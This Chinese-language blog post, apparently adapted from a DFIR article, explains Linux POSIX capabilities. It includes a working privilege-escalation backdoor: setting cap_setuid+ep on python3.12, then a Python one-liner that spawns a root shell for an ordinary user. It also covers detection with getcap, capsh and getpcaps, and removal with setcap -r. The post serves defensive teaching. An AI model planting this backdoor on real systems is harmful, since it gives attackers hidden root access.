---
title: Linux访问控制机制
date: 2025-10-23 02:58:49
tags:
- linux
- access control
- posix capabilities
---
# Linux 访问控制机制：利用 POSIX 功能提升权限
> 参考来源 https://dfir.ch/posts/linux_capabilities/

## 前情提要
在 Linux 系统中，传统上有两种主要的权限提升机制：SUID（设置用户 ID）和 SGID（设置组 ID）。这些机制允许用户在执行特定二进制文件时临时获得文件所有者或组的权限，通常是 root 用户。然而，这种方法存在安全风险，因为它授予了过多的权限，可能导致系统被滥用。
为了解决这些问题，Linux 引入了 POSIX 能力（Capabilities）机制。该机制允许将 root 用户的权限划分为更小、更具体的单元，这些单元可以单独分配给进程。这种方法提高了系统的安全性，因为它允许仅授予进程所需的最低权限，从而减少了潜在的攻击面。

Capabilities是 Linux 中的一种细粒度访问控制机制，允许比传统超级用户 ( root) 模型更精细的权限。权能将通常与 root 用户关联的权限划分为不同的单元，这些单元可以针对不同的进程单独启用或禁用。这使得权限管理更加安全可控。

例如，某个进程可能需要绑定到特权端口的权限，但不需要任何其他提升的权限。通过使用能力，系统管理员可以更好地控制进程的权限，从而减少潜在的安全风险。
要了解我们的 Linux 主机知道多少功能，我们可以查询目录cap_last_cap内的文件/proc：
```
# cat /proc/sys/kernel/cap_last_cap
40
```
该capsh --print命令显示 shell 或调用该命令的进程的当前功能及相关设置。在我们的 Linux 主机上执行此命令时，我们可以看到完整的功能列表。
```
# capsh --print
Current: =ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
```
每种能力都对应一个特定的特权操作。

## Python 后门
该命令setcap用于设置可执行文件的文件权限。该cap_setuid权限允许进程对用户 ID (UID) 进行任意操作，包括将 UID 设置为原本受限制的值（例如UID 0root 用户）。该命令setcap接受一组参数，其中
```
e：有效表示该功能已激活
p：允许表示可以使用/允许该功能。
```
综上所述，我们将向cap_setuidPython 二进制文件添加以下功能：
```
# setcap cap_setuid+ep /usr/bin/python3.12
```
您可以在这里找到支持的功能列表：
```
# cat /usr/include/linux/capability.h
```
测试
为了测试目的，我们创建了一个新用户（malmoeb）并切换到该用户的上下文（useradd && su）：
```
# useradd -m malmoeb
# su malmoeb
$ id
uid=1000(malmoeb) gid=1000(malmoeb) groups=1000(malmoeb)
```
使用以下命令行，我们将使用 Python 调用的 bash shell 的 UID 设置为 0 ( UID 0 == root)，从而有效地生成一个 root shell：
```

$ /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# id
uid=0(root) gid=1000(malmoeb) groups=1000(malmoeb)
```
这种技术令人兴奋的地方在于，我们并没有在二进制文件上设置 suid 位，也没有修改 Python 二进制文件。通过设置权限，我们作为攻击者可以构建一个强大的后门。

## 应用
传统上，系统管理员和安全专业人员专注于查找SUID（设置用户 ID）和SGID（设置组 ID）文件，因为这些文件可用于在特定条件下提升权限。然而，随着 POSIX 功能的引入，查找设置了功能的文件现在也同样重要，如上所示。

使用以下命令可以枚举所有设置了功能的二进制文件`getcap -r`
```
# getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.12 cap_setuid=ep
```
在 /proc 目录内：
```
# cat /proc/1143966/status | grep Cap
```
在哪里：
```
CapInh= 继承的能力
CapPrm= 允许的能力
CapEff= 有效能力
CapBnd= 边界集
CapAmb= 环境功能设置
```
利用命令capsh，我们解码功能如下：
```
# capsh --decode=0000000000000080
0x0000000000000080=cap_setuid
```
或者使用命令getpcaps，将 PID 作为参数传递：
```
# getpcaps 1143966
Capabilities for `1143966': = cap_setuid+ep
```
使用以下命令从二进制文件中移除功能setcap -r
```
# setcap -r /usr/bin/python3.12
```

